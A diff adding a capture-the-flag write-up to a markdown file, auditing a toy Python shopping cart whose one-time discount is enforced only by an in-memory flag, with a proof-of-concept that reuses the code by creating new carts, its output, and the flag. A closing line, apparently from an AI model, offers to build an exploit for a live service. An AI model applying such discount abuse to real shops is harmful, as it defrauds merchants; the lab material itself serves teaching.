@@ -1357,7 +1357,127 @@ print(cart.checkout())
 
 ### Exploitation Steps
 
+### Code Audit
 
+### #### What Does This Code Do?
+
+The code implements a basic shopping cart system for an e-commerce platform. It consists of:
+
+- A `Product` class with `name` and `price`.
+    
+- A `Cart` class that:
+    
+    - Manages added products.
+        
+    - Tracks the total cart value.
+        
+    - Allows applying a discount code (`WELCOME10`) **once** via a boolean flag `self.discount_applied`.
+        
+    - Outputs the final payable amount via `checkout()`.
+        
+
+Key logic:
+
+```python
+def apply_discount(self, code):
+    if code == "WELCOME10":
+        if not self.discount_applied:
+            self.total -= 10
+            self.discount_applied = True
+```
+
+This logic is meant to ensure the discount is only applied once per user.
+
+---
+
+### #### What Is the Flaw?
+
+The restriction on discount reuse is enforced **only in memory**, using the `self.discount_applied` attribute inside the `Cart` object.
+
+That means:
+
+- The "one-time use" check applies **per cart session**, not per user account or backend record.
+    
+- Users can simply:
+    
+    - Refresh their session.
+        
+    - Use a new browser/incognito tab.
+        
+    - Reinstantiate a new cart object.
+        
+    - Re-register or spoof being a new user.
+        
+- There is no user validation, server-side token, database record, or unique tracking for discount code usage.
+    
+
+### ✅ Conclusion:
+
+The flaw lies in trusting a temporary, user-controlled client-side/cart object (`self.discount_applied`) to enforce a server-side business logic rule.
+
+---
+
+## 💥 Exploitation Steps
+
+### 🎯 Goal
+
+Exploit the fact that each new cart instance allows reapplication of the "one-time use" discount.
+
+### 🧪 PoC Code (Proof of Concept)
+
+```python
+# Simulating discount abuse by re-instantiating the cart
+class Product:
+    def __init__(self, name, price):
+        self.name = name
+        self.price = price
+
+class Cart:
+    def __init__(self):
+        self.items = []
+        self.total = 0
+        self.discount_applied = False
+
+    def add_product(self, product):
+        self.items.append(product)
+        self.total += product.price
+
+    def apply_discount(self, code):
+        if code == "WELCOME10":
+            if not self.discount_applied:
+                self.total -= 10
+                self.discount_applied = True
+            else:
+                print("Discount already applied")
+
+    def checkout(self):
+        return f"Total to pay: ${self.total}"
+
+# Exploitation: user repeatedly creates new carts to re-apply discount
+for i in range(3):
+    cart = Cart()
+    cart.add_product(Product("Phone", 250))
+    cart.apply_discount("WELCOME10")
+    print(f"[Cart {i+1}] ->", cart.checkout())
+```
+
+### 🖨️ Output:
+
+```
+[Cart 1] -> Total to pay: $240
+[Cart 2] -> Total to pay: $240
+[Cart 3] -> Total to pay: $240
+```
+
+---
+
+## 🏁 Flag
+
+```
+h4kit{self.discount_applied, apply_discount}
+```
+
+Let me know if you want the full write-up exported in Markdown or PDF format, or if you'd like to build an exploit for a live service version of this code.
 
 ### 🚩Flag Captured: ``
 
